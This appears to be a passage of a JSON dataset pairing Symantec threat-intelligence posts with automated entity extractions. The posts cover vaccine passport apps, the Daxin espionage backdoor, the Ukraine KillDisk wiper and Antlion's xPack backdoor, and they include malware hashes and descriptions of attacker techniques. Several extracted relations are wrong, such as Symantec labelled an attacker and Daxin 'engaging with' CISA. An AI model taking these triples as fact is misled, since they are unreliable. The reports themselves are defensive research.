        ],
        [
          "Backdoor.Daxin",
          "contains",
          "ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef"
        ],
        [
          "Backdoor.Daxin",
          "targets",
          "two separate organizations"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 3
  },
  {
    "title": "covid passport risks",
    "link": "https://www.security.com/threat-intelligence/covid-passport-risks",
    "content": "As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing. With a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate. Symantec, a division ofBroadcom Software, took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present. A vaccine passport is a paper or digital form certifying a person has been vaccinated against a disease, in this case COVID-19. While paper passports may be used, more often the digital form is used, which may, in some cases, be only a screenshot of the results or picture directly taken of the vaccine card (this may work in some cases, although it lacks authenticity that the results are from the provider and have not been tampered with). Digital vaccination passports have QR codes that contain and connect a user’s encoded health data (a vaccination record from a medical provider) to the vaccinated person's passport app. Issuers of the encoded vaccination data include healthcare providers and government entities. These entities follow one of two standards concerning the structure of the encoded data. The first standard, followed primarily by issuers in the U.S. and Canada, is the SMART Health Card Framework from VCI, a broad coalition of leading healthcare and technology organizations. The second standard, recognized internationally, is the EU Digital COVID Certificate and uses the Electronic Health Certificate Container Format (HCERT). Both standards use QR codes and are very similar as far as data structure, with one key difference as we will see below. The tools, or validation apps, used to decode the vaccination data in the passport app QR codes are readily available. Using one of these tools, we will take a look at the data contained in one of the QR codes, using an example code from California's digital vaccine record system. Note the \"SMART\" logo (Figure 1) identifying it as a SMART Health Card. $  zbarimg qrcode_passport.png --raw --quiet shc:/567629095243206034602924374044603122295953265460346029254077280433602 8702864716745222809286155305564710341432164324111083963210645240371337721 2638633677424237084126633945392929556404425627596537253338446120605736010 645315539723274242843574557440550766267775…. The shc:/ further identifies the SMART Health scheme and the data encodes to a JSON Web Token (JWT). Note that the data is not encrypted, simply encoded. Encoded meaning it may look like just black bars and numbers but decodes directly to the raw vaccination data. Once decoded, we find that the data mainly contains the same data as the paper version of the vaccination record. Specifically, the full set of data, in this example, includes: $ zbarimg qrcode_passport.png --raw --quiet | xargs ./jwt_tool.py --shc JWT Token: eyJ6aXAiOiJERUYiLCJhbGciOiJFUzI1NiIsImtpZCI6IjdKdmt0VXBmMV85TlB3ZE0tNzBGSlQzWWR5VGlT[...]. 3ZLdTuMwEIXfZfY2_ykpzeW[...].YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T [+] kid = \"7JvktUpf1_9NPwdM-70FJT3YdyTiSe2Ivm…\" Token payload values: [+] iss = \"https://myvaccinerecord.cdph.ca.gov/creds\" [+] nbf = 1635982044    ==> TIMESTAMP = 2021-11-03 16:27:24 (UTC) [+] vc = JSON object: [+] type = \"['https://smarthealth.cards#health-card', 'https://smarthealth.cards#immunization', 'https://smarthealth.cards#covid19']\" [+] credentialSubject =  {\"fhirVersion\": \"4.0.1\", \"fhirBundle\": {\"resourceType\": \"Bundle\", \"type\": \"collection\", \"entry\": [{\"fullUrl\": \"resource:0\", \"resource\": {\"resourceType\": \"Patient\", \"name\": [{\"family\": \"Doe\", \"given\": [\"John\"]}], \"birthDate\": \"1980-01-01\"}}, {\"fullUrl\": \"resource:1\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-03-01\", \"lotNumber\": \"EN6208\"}}, {\"fullUrl\": \"resource:2\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-04-01\", \"lotNumber\": \"ER8737\"}}]}}}} YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T It is important to note that anyone with the QR code can decode this information, as it is not encrypted. The same data can be used to copy and generate the same QR code. The signature, on the other hand, can be used to verify that the passport has not been changed or tampered with and that it came from the issuer, in this case the State of California. By providing the signature and sharing the public key, anyone can verify the vaccine passport has not been tampered with and is from the issuer. Internationally, QR code vaccination records use the Electronic Health Certificate Container Format (HCERT). Similar to the SMART Health Card, the QR image contains a header, payload, and signature. The payload contains mostly the same vaccination record data - name, date of birth, vaccination record, and dates. The signature is also used to validate the authenticity of the digital vaccination record. However, the difference is in the header. SMART Health Cards contain a link/URL to the issuer in the header, which contains the public key used to validate the authenticity of the record using the signature. HCERT QR codes only contain the name of the issuer in the header, and it is up to the verifier app to find and store the public key from the issuer. What are the actual data privacy risks associated with digital vaccine passports? At a minimum, the personal data they contain includes the person's name, date of birth, and vaccine status. This data may be considered medical data and, if exposed, poses a risk if obtained by scammers, who may use it for targeted phishing attacks. Another, and arguably greater and potentially graver risk, is the validity and accuracy of the vaccine passport. Similar to traditional passports, counterfeiting or tampering with the results may in some jurisdictions result in criminal penalties. Therefore, the technology to identify digital vaccine passports must securely and accurately identify their validity and ensure the results have not been tampered with. Otherwise, people may be exposed to the virus and this could come with deadly consequences. We analyzed 40 digital vaccine passport apps and 10 validation apps. The apps we examined were from government entities and regional health providers in multiple countries around the world. Digital vaccine passports are commonly stored on a person's mobile device inside a digital wallet. This provides the convenience of being able to quickly and easily open and show vaccination records when requested. If done right, the person can be confident the data is accurate and secure. Not done right, and the vaccination record can potentially be read by an attacker, either via a network attack or a malicious app on the user’s mobile device. Note that our app analysis focused on publicly available mobile apps used to store vaccination records. Apple and Google also provide storage and retrieval for vaccine passports - Apple via the Health App and Google via Google Wallet - and while our findings for these solutions didn't raise any security flags, it is important to note that both rely on app sandbox protection and sharing permissions to protect vaccination records. This means that if the mobile device is compromised by an attacker, or if the user is tricked into sharing the health data, all bets are off. Wallets that store data in the cloud may expose the user’s vaccination records by including hardcoded cloud credentials inside the app. During our analysis we also found wallets containing hardcoded cloud credentials, potentially exposing sensitive users’ data. Vaccine records may also be exposed if the digital wallet app transfers data from the cloud unencrypted or insecurely. In addition, vaccine records may be exposed if the user unknowingly shares the health data to other apps on their device, or if the vaccine records are stored insecurely on the device. Knowing these threat scenarios, we analyzed the apps looking for risky behaviors that include: Out of the 40 digital passport wallet apps analyzed, 27 exhibited at least one of these risky behaviors. To verify that a vaccine passport is legitimate, validation apps exist that decode the data in the QR code and flag if the vaccination record has been tampered with. As we saw when decoding the example QR code, a signature is contained inside the record that can be used to verify that the record is from the issuer and has not been tampered with. How do we know the QR code is from a specific health provider or issuer? Also inside the QR code is the link to the public key used to sign the record, which is then used to validate the signature. Anyone can create a QR code and put in their own issuer links, therefore a validation app must show and/or whitelist only approved issuers. Otherwise, anyone could use a fake state or medical named issuer URL with fake vaccination record data and the validation app would blindly pass the person. This type of flaw wasfound in the Quebec Vaxicode Verif app in late 2021. When transferring the public key from the issuer or health provider, the URL must be securely accessed and transferred to the mobile device running the app. If the validation app insecurely accesses the URL, an attacker may change the public key and \"pass\" their fake vaccination record. Or, even more deviously, change it to selectively fail other vaccination records. Often validation apps also store the digital vaccine records, either locally or in the cloud. If that is the case, which ideally it shouldn't be, the validation apps are subject to the same risks and threat scenarios as digital wallet apps. Knowing this, we looked for the same previously listed risky behaviors in seven validation apps available at the time of this report and found all of them to be safe. That being said, we will continue to scan new versions of those apps, as well as new validation apps, as they appear on our customers' mobile devices. This is yet another reminder to always be vigilant of apps claiming to protect your privacy and identity, including digital passport wallets. Only give apps permission to private data that they require, nothing more. Whenever possible, avoid third-party apps claiming to securely store your vaccination records and instead use digital wallet solutions provided by the major mobile platforms, such as the Apple Health app and Google Wallet. App developers should only collect and access the user data required to provide the service to the user. Developers should also understand and implement best security practices that protect the users’ private data in the cloud, in transit, and on device. Anything less may compromise your users’ privacy, expose personal medical data, and potentially undermine the legitimacy of their vaccination records entirely. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Broadcom Software, Company), (vaccine passport, Threat Type), (paper, File), (digital form, File), (picture, Image), (vaccine card, File), (tampered with, Exploit)\nRelationships: (Symantec, takes a look at, vaccine passport), (Symantec, company, Broadcom Software), (vaccine passport, contains, paper), (vaccine passport, contains, digital form), (vaccine passport, contains, picture), (vaccine passport, contains, vaccine card), (vaccine passport, potentiallyExploits, tampered with)",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "vaccine passport",
          "Threat Type"
        ],
        [
          "paper",
          "File"
        ],
        [
          "digital form",
          "File"
        ],
        [
          "picture",
          "Image"
        ],
        [
          "vaccine card",
          "File"
        ],
        [
          "tampered with",
          "Exploit"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "takes a look at",
          "vaccine passport"
        ],
        [
          "Symantec",
          "company",
          "Broadcom Software"
        ],
        [
          "vaccine passport",
          "contains",
          "paper"
        ],
        [
          "vaccine passport",
          "contains",
          "digital form"
        ],
        [
          "vaccine passport",
          "contains",
          "picture"
        ],
        [
          "vaccine passport",
          "contains",
          "vaccine card"
        ],
        [
          "vaccine passport",
          "potentiallyExploits",
          "tampered with"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 7
  },
  {
    "title": "daxin backdoor espionage",
    "link": "https://www.security.com/threat-intelligence/daxin-backdoor-espionage",
    "content": "New research by the Symantec Threat Hunter team, part of Broadcom Software, has uncovered a highly sophisticated piece of malware being used by China-linked threat actors, exhibiting technical complexity previously unseen by such actors.  The malware appears to be used in a long-running espionage campaign against select governments and other critical infrastructure targets. There is strong evidence to suggest the malware, Backdoor.Daxin, which allows the attacker to perform various communications and data-gathering operations on the infected computer, has been used as recently as November 2021 by attackers linked to China. Most of the targets appear to be organizations and governments of strategic interest to China. In addition, other tools associated with Chinese espionage actors were found on some of the same computers where Daxin was deployed. Daxin is without doubt the most advanced piece of malware Symantec researchers have seen used by a China-linked actor. Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target’s network and exfiltrate data without raising suspicions. Through Broadcom’s membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchersworked with the Cyber Security and Infrastructure Security Agency (CISA) to engage with multiple foreign governments targeted with Daxinand assisted in detection and remediation. This is the first in a series of blogs. This blog provides an overview of Daxin’s capabilities and will be followed with additional blogs providing further in-depth analysis. As described in more detail below, Daxin comes in the form of a Windows kernel driver, a relatively rare format for malware nowadays. It implements advanced communications functionality, which both provides a high degree of stealth and permits the attackers to communicate with infected computers on highly secured networks, where direct internet connectivity is not available. These features are reminiscent of Regin,an advanced espionage tool discovered by Symantec in 2014that others have linked to Western intelligence services. Daxin’s capabilities suggest the attackers invested significant effort into developing communication techniques that can blend in unseen with normal network traffic on the target’s network. Specifically, the malware avoids starting its own network services. Instead, it can abuse any legitimate services already running on the infected computers. Daxin is also capable of relaying its communications across a network of infected computers within the attacked organization. The attackers can select an arbitrary path across infected computers and send a single command that instructs these computers to establish requested connectivity. This use case has been optimized by Daxin’s designers. Daxin also features network tunneling, allowing attackers to communicate with legitimate services on the victim’s network that can be reached from any infected computer. Daxin is a backdoor that allows the attacker to perform various operations on the infected computer such as reading and writing arbitrary files. The attacker can also start arbitrary processes and interact with them. While the set of operations recognized by Daxin is quite narrow, its real value to attackers lies in its stealth and communications capabilities. Daxin is capable of communicating by hijacking legitimate TCP/IP connections. In order to do so, it monitors all incoming TCP traffic for certain patterns. Whenever any of these patterns are detected, Daxin disconnects the legitimate recipient and takes over the connection. It then performs a custom key exchange with the remote peer, where two sides follow complementary steps. The malware can be both the initiator and the target of a key exchange. A successful key exchange opens an encrypted communication channel for receiving commands and sending responses. Daxin’s use of hijacked TCP connections affords a high degree of stealth to its communications and helps to establish connectivity on networks with strict firewall rules. It may also lower the risk of discovery by SOC analysts monitoring for network anomalies. Daxin’s built-in functionality can be augmented by deploying additional components on the infected computer. Daxin provides a dedicated communication mechanism for such components by implementing a device named “\\\\.\\Tcp4”. The malicious components can open this device to register themselves for communication. Each of the components can associate a 32-bit service identifier with the opened \\\\.\\Tcp4 handle. The remote attacker is then able to communicate with selected components by specifying a matching service identified when sending messages of a certain type. The driver also includes a mechanism to send back any responses. There are also dedicated messages that encapsulate raw network packets to be transmitted via the local network adapter. Daxin then tracks network flows, such that any response packets are captured and forwarded to the remote attacker. This allows the attacker to establish communication with legitimate services that are reachable from the infected machine on the target’s network, where the remote attacker uses network tunnels to interact with internal servers of interest. Perhaps the most interesting functionality is the ability to create a new communications channel across multiple infected computers, where the list of nodes is provided by the attacker in a single command. For each node, the message includes all the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its own TCP/IP stack to connect to the TCP server listed in the selected entry. Once connected, Daxin starts the initiator side protocol. If the peer computer is infected with Daxin, this results in opening a new encrypted communication channel. An updated copy of the original message is then sent over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. While it is not uncommon for attackers’ communications to make multiple hops across networks in order to get around firewalls and generally avoid raising suspicions, this is usually done step-by-step, such that each hop requires a separate action. However, in the case of Daxin, this process is a single operation, suggesting the malware is designed for attacks on well-guarded networks, where attackers may need to periodically reconnect into compromised computers. The Symantec Threat Hunter team has identified Daxin deployments in government organizations as well as entities in the telecommunications, transportation, and manufacturing sectors. Several of these victims were identified with the assistance of the PwC Threat Intelligence team. While the most recent known attacks involving Daxin occurred in November 2021, the earliest known sample of the malware dates from 2013 and included all of the advanced features seen in the most recent variants, with a large part of the codebase having already been fully developed. This suggests that the attackers were already well established by 2013, with Daxin features reflecting their expertise at that time. We believe that before commencing development of Daxin, the attackers were already experimenting for some time with the techniques that become part of Daxin. An older piece of malware – Backdoor.Zala (aka Exforel) – contained a number of common features but did not have many of Daxin’s advanced capabilities. Daxin appears to build on Zala’s networking techniques, reusing a significant amount of distinctive code and even sharing certain magic constants. This is in addition to a certain public library used to perform hooking that is also common between some variants of Daxin and Zala. The extensive sharing indicates that Daxin designers at least had access to Zala’s codebase. We believe that both malware families were used by the same actor, which became active no later than 2009. There are several examples of attacks where tools known to be associated with Chinese espionage actors have been observed along with what we believe to be variants of Daxin. In a November 2019 attack against an information technology company, the attackers used a single PsExec session to first attempt to deploy Daxin before then resorting to Trojan.Owprox. Owprox is associated with the China-linked Slug (aka Owlproxy). In May 2020, malicious activity involving both Backdoor.Daxin and Trojan.Owprox occurred on a single computer belonging to another organizations, a technology company. In a July 2020 attack against a military target, the attackers made two unsuccessful attempts to deploy a suspicious driver. When these attempts failed, the attackers resorted to different malware instead, a variant of Trojan.Emulov. Symantec did not obtain either of the two suspicious drivers used in this attack. However, very strong similarities between this attack and earlier activity in which Daxin was used suggests that it is highly likely the attackers attempted to deploy Daxin before falling back on the other malware. In summary, Daxin includes some of the most complex features we have seen in a highly probable China-linked malware campaign. We will publish follow-up blogs over the coming days with more detailed technical analysis and other insights from our research and collaborations. For the latest protection updates, please visit theSymantec Protection Bulletin. Malware related to Daxin activity: 81c7bb39100d358f8286da5e9aa838606c98dfcc263e9a82ed91cd438cb130d1 Backdoor.Daxin (32-bit core) 06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4 Backdoor.Daxin (64-bit core) 0f82947b2429063734c46c34fb03b4fa31050e49c27af15283d335ea22fe0555 Backdoor.Daxin (64-bit core) 3e7724cb963ad5872af9cfb93d01abf7cd9b07f47773360ad0501592848992f4 Backdoor.Daxin (64-bit core) 447c3c5ac9679be0a85b3df46ec5ee924f4fbd8d53093125fd21de0bff1d2aad Backdoor.Daxin (64-bit core) 49c827cf48efb122a9d6fd87b426482b7496ccd4a2dbca31ebbf6b2b80c98530 Backdoor.Daxin (64-bit core) 5bc3994612624da168750455b363f2964e1861dba4f1c305df01b970ac02a7ae Backdoor.Daxin (64-bit core) 5c1585b1a1c956c7755429544f3596515dfdf928373620c51b0606a520c6245a Backdoor.Daxin (64-bit core) 6908ebf52eb19c6719a0b508d1e2128f198d10441551cbfb9f4031d382f5229f Backdoor.Daxin (64-bit core) 7867ba973234b99875a9f5138a074798b8d5c65290e365e09981cceb06385c54 Backdoor.Daxin (64-bit core) 7a08d1417ca056da3a656f0b7c9cf6cd863f9b1005996d083a0fc38d292b52e9 Backdoor.Daxin (64-bit core) 8d9a2363b757d3f127b9c6ed8f7b8b018e652369bc070aa3500b3a978feaa6ce Backdoor.Daxin (64-bit core) b0eb4d999e4e0e7c2e33ff081e847c87b49940eb24a9e0794c6aa9516832c427 Backdoor.Daxin (64-bit core) b9dad0131c51e2645e761b74a71ebad2bf175645fa9f42a4ab0e6921b83306e3 Backdoor.Daxin (64-bit core) cf00e7cc04af3f7c95f2b35a6f3432bef990238e1fa6f312faf64a50d495630a Backdoor.Daxin (64-bit core) e7af7bcb86bd6bab1835f610671c3921441965a839673ac34444cf0ce7b2164e Backdoor.Daxin (64-bit core) ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef Backdoor.Daxin (64-bit core) 08dc602721c17d58a4bc0c74f64a7920086f776965e7866f68d1676eb5e7951f Backdoor.Daxin (dropper) 53d23faf8da5791578c2f5e236e79969289a7bba04eee2db25f9791b33209631 Backdoor.Daxin (dropper) 7a7e8df7173387aec593e4fe2b45520ea3156c5f810d2bb1b2784efd1c922376 Backdoor.Zala (32-bit core) 8dafe5f3d0527b66f6857559e3c81872699003e0f2ffda9202a1b5e29db2002e Backdoor.Zala (32-bit core) 96bf3ee7c6673b69c6aa173bb44e21fa636b1c2c73f4356a7599c121284a51cc Backdoor.Trojan (32-bit core) 9c2f3e9811f7d0c7463eaa1ee6f39c23f902f3797b80891590b43bbe0fdf0e51 Backdoor.Trojan (32-bit core) c0d88db11d0f529754d290ed5f4c34b4dba8c4f2e5c4148866daabeab0d25f9c Backdoor.Trojan (32-bit core) e6a7b0bc01a627a7d0ffb07faddb3a4dd96b6f5208ac26107bdaeb3ab1ec8217 Backdoor.Trojan (32-bit core) File names attributed to Daxin activity: \"ndislan_win2008_x64.sys\" \"performanceaudit.sys\" \"[CSIDL_SYSTEM]\\drivers\\pagefile.sys\" \"[CSIDL_SYSTEM]\\spool\\drivers\\ntds.sys\" Malware observed during overlapping activities: 705be833bd1880924c99ec9cf1bd0fcf9714ae0cec7fd184db051d49824cbbf4 suspected Backdoor.Daxin c791c007c8c97196c657ac8ba25651e7be607565ae0946742a533af697a61878 suspected Backdoor.Daxin 514d389ce87481fe1fc6549a090acf0da013b897e282ff2ef26f783bd5355a01 Trojan.Emulov (core) 1a5c23a7736b60c14dc50bf9e802db3fcd5b6c93682bc40141d6794ae96138d3 Trojan.Emulov (dropper) a0ac5f7d41e9801b531f8ca333c31021c5e064f13699dbd72f3dfd429f19bb26 Trojan.Owprox (core) aa7047a3017190c66568814eb70483bf74c1163fb4ec1c515c1de29df18e26d7 Trojan.Owprox (dropper) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec Threat Hunter team, Attacker), (China, Attacker), (Backdoor.Daxin, Malware), (November 2021, Time Period), (JCDC, Organization), (CISA, Organization), (Daxin, Malware), (foreign governments, Target)\nRelationships: (Symantec Threat Hunter team, uses, JCDC), (Symantec Threat Hunter team, worksWith, CISA), (Symantec Threat Hunter team, engagedWith, foreign governments), (backdoor.Daxin, uses, JCDC), (backdoor.Daxin, engagesWith, CISA), (backdoor.Daxin, targets, foreign governments), (backdoor.Daxin, exploitedBy, China), (backdoor.Daxin, optimizedFor, hardened targets), (backdoor.Daxin, exfiltratesData, withoutraisingsuspicions)",
      "entities": [
        [
          "Symantec Threat Hunter team",
          "Attacker"
        ],
        [
          "China",
          "Attacker"
        ],
        [
          "Backdoor.Daxin",
          "Malware"
        ],
        [
          "November 2021",
          "Time Period"
        ],
        [
          "JCDC",
          "Organization"
        ],
        [
          "CISA",
          "Organization"
        ],
        [
          "Daxin",
          "Malware"
        ],
        [
          "foreign governments",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Symantec Threat Hunter team",
          "uses",
          "JCDC"
        ],
        [
          "Symantec Threat Hunter team",
          "worksWith",
          "CISA"
        ],
        [
          "Symantec Threat Hunter team",
          "engagedWith",
          "foreign governments"
        ],
        [
          "backdoor.Daxin",
          "uses",
          "JCDC"
        ],
        [
          "backdoor.Daxin",
          "engagesWith",
          "CISA"
        ],
        [
          "backdoor.Daxin",
          "targets",
          "foreign governments"
        ],
        [
          "backdoor.Daxin",
          "exploitedBy",
          "China"
        ],
        [
          "backdoor.Daxin",
          "optimizedFor",
          "hardened targets"
        ],
        [
          "backdoor.Daxin",
          "exfiltratesData",
          "withoutraisingsuspicions"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 9
  },
  {
    "title": "ukraine wiper malware russia",
    "link": "https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia",
    "content": "UPDATE February 24, 2022, 13:42:This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks. UPDATE February 25, 2022, 17:00:This blog has been updated with details on how a known Microsoft SQL Server  vulnerability (CVE-2021-1636) was exploited in at least one attack. A new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division ofBroadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors. Trojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper Once run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities. Initial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings. In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23. An organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers may have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to download a JPEG file from an internal server, on the victim’s network. A minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task. Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead. Beginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the following: Following this activity, PowerShell was used to dump credentials from the compromised machine: Later, following the above activity, several unknown PowerShell scripts were executed. Five minutes later, the wiper (Trojan.KillDisk) was deployed. The attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server (CVE-2021-1636) in order to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the following process lineage was used to execute the “whoami” command on November 11 2021: The next day, the same process lineage was responsible for executing the following PowerShell command: The organization was running an unpatched version of Microsoft SQL Server. In several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe.  It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware. With an invasion now underway, there remains a high likelihood of further cyber attacks against Ukraine and other countries in the region. Symantec’s Threat Hunter Team will continue to actively monitor the situation and post updates to this blog if new information becomes available. Symantec Endpoint products will detect and block this threat using the following signatures: For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (Trojan.Killdisk, Malware), (CVE-2021-1636, Vulnerability), (Hermetica Digital Ltd., Tool), (EaseUS Partition Master, Tool), (Lempel-Ziv, Technique), (Master Boot Record, Vulnerability), (MBR, Vulnerability)\nRelationships: (ransomware, uses, Trojan.Killdisk), (Trojan.Killdisk, contains, 32-bit and 64-bit driver files), (Trojan.Killdisk, contains, Lempel-Ziv algorithm), (Trojan.Killdisk, contains, resource section), (Trojan.Killdisk, drops, driver file), (Trojan.Killdisk, runs, MBR), (Trojan.Killdisk, damages, MBR), (Trojan.Killdisk, appearsToHave, additional functionality), (Trojan.Killdisk, initialIndicationsSuggest, attacks), (Trojan.Killdisk, appearsToHave, destructionCapabilities), (Trojan.Killdisk, appearsToHave, OSversionDependent), (Trojan.Killdisk, appearsToHave, masterBootRecord), (Trojan.Killdisk, appearsToHave, bootSectorDamage), (Trojan.Killdisk, appearsToHave, inoperableState), (Trojan.Killdisk, appearsToHave, inoperativeCondition),",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "Trojan.Killdisk",
          "Malware"
        ],
        [
          "CVE-2021-1636",
          "Vulnerability"
        ],
        [
          "Hermetica Digital Ltd.",
          "Tool"
        ],
        [
          "EaseUS Partition Master",
          "Tool"
        ],
        [
          "Lempel-Ziv",
          "Technique"
        ],
        [
          "Master Boot Record",
          "Vulnerability"
        ],
        [
          "MBR",
          "Vulnerability"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "uses",
          "Trojan.Killdisk"
        ],
        [
          "Trojan.Killdisk",
          "contains",
          "32-bit and 64-bit driver files"
        ],
        [
          "Trojan.Killdisk",
          "contains",
          "Lempel-Ziv algorithm"
        ],
        [
          "Trojan.Killdisk",
          "contains",
          "resource section"
        ],
        [
          "Trojan.Killdisk",
          "drops",
          "driver file"
        ],
        [
          "Trojan.Killdisk",
          "runs",
          "MBR"
        ],
        [
          "Trojan.Killdisk",
          "damages",
          "MBR"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "additional functionality"
        ],
        [
          "Trojan.Killdisk",
          "initialIndicationsSuggest",
          "attacks"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "destructionCapabilities"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "OSversionDependent"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "masterBootRecord"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "bootSectorDamage"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "inoperableState"
        ],
        [
          "Trojan.Killdisk",
          "appearsToHave",
          "inoperativeCondition"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 15
  },
  {
    "title": "china apt antlion taiwan financial attacks",
    "link": "https://www.security.com/threat-intelligence/china-apt-antlion-taiwan-financial-attacks",
    "content": "Chinese state-backed advanced persistent threat (APT) group Antlion has been targeting financial institutions in Taiwan in a persistent campaign over the course of at least 18 months. The attackers deployed a custom backdoor we have called xPack on compromised systems, which gave them extensive access to victim machines. The backdoor allowed the attackers to run WMI commands remotely, while there is also evidence that they leveraged EternalBlue exploits in the backdoor. The attackers appeared to have the ability to interact with SMB shares, and it's possible that they used mounted shares over SMB to transfer files from attacker-controlled infrastructure. There is also evidence that the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address. The goal of this campaign appears to have been espionage, as we saw the attackers exfiltrating data and staging data for exfiltration from infected networks. As well as the attack on the financial institution outlined in thecase study below, Antlion compromised the networks of at least two other organizations in Taiwan, including another financial organization and a manufacturing company. The activity the group carried out on those networks was largely similar to the activity that is detailed in the case study, with the xPack backdoor frequently deployed and a lot of evidence of credential dumping. In the manufacturing target, also, we see the attackers attempting to download malicious files via SMB shares. The attackers also spent a significant amount of time on both these targeted networks, spending close to 250 days on the financial organization and around 175 days on the manufacturing organization. Symantec, a division of Broadcom, cannot state with certainty what the initial infection vector used by the attackers in this campaign was, though in one instance they were seen utilizing the MSSQL service to execute system commands, which indicates that the most likely infection vector was exploitation of a web application or service. However, Antlion are also known to have previously used malicious emails to gain initial access to victim networks. The main custom backdoor used by Antlion in this campaign was the xPack backdoor, which is a custom .NET loader that decrypts (AES), loads, and executes accompanying .bin files. Its decryption password is provided as a command-line argument (Base64 encoded string), and xPack is intended to be run as a standalone application or as a service (xPackSvc variant). The xPack malware and its associated payload seems to be used for initial access; it appears that xPack was predominantly used to execute system commands, drop subsequent malware and tools, and stage data for exfiltration. The attackers also used a custom keylogger and three custom loaders. The attackers also used a custom SMB session enumeration tool (NetSessionEnum), a custom bind/reverse file transfer tool named ENCODE MMC, and a Kerberos golden ticket tool based on Mimikatz. The attackers also used a variety of off-the-shelf tools, as well as leveraging 